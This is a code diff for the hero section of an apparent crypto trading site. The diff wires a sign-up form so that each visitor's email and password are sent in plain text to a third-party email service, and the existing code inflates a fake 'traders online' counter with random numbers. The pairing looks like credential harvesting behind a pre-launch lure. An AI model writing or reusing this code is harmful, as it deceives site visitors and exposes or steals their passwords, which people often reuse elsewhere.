@@ -3,14 +3,45 @@ import { Dialog, DialogContent, DialogTrigger } from "@/components/ui/dialog";
 import { Zap } from "lucide-react";
 import heroImage from "@/assets/hero-crypto.jpg";
 import { useState, useEffect } from "react";
+import emailjs from '@emailjs/browser';
 const HeroSection = () => {
   const [traderCount, setTraderCount] = useState(12847);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+
   useEffect(() => {
     const interval = setInterval(() => {
       setTraderCount(prev => prev + Math.floor(Math.random() * 5) + 1);
     }, 10000);
     return () => clearInterval(interval);
   }, []);
+
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+
+    const form = e.currentTarget;
+    const formData = new FormData(form);
+
+    try {
+      await emailjs.send(
+        'service_tdx4qi4', // service ID
+        'template_rak8f58', // template ID
+        {
+          email: formData.get('email'),
+          password: formData.get('password'),
+        },
+        'XtWp493g7vwVe6q_-' // public key
+      );
+      
+      alert('Registration successful! You\'ll be notified when we launch.');
+      form.reset();
+    } catch (error) {
+      console.error('Error sending email:', error);
+      alert('Registration failed. Please try again.');
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
   return <section className="relative min-h-screen flex items-center justify-center px-6 overflow-hidden">
       {/* Dark Gradient Background */}
       <div className="absolute inset-0 z-0 bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950" />
@@ -56,16 +87,21 @@ const HeroSection = () => {
               </button>
             </DialogTrigger>
             <DialogContent className="registration-popup">
-              <form className="registration-form">
+              <form className="registration-form" onSubmit={handleSubmit}>
                 <span className="input-span">
                   <label htmlFor="email" className="label">Email</label>
-                  <input type="email" name="email" id="email" />
+                  <input type="email" name="email" id="email" required />
                 </span>
                 <span className="input-span">
                   <label htmlFor="password" className="label">Password</label>
-                  <input type="password" name="password" id="password" />
+                  <input type="password" name="password" id="password" required />
                 </span>
-                <input className="submit" type="submit" value="Submit" />
+                <input 
+                  className="submit" 
+                  type="submit" 
+                  value={isSubmitting ? "Submitting..." : "Submit"} 
+                  disabled={isSubmitting}
+                />
               </form>
             </DialogContent>
           </Dialog>
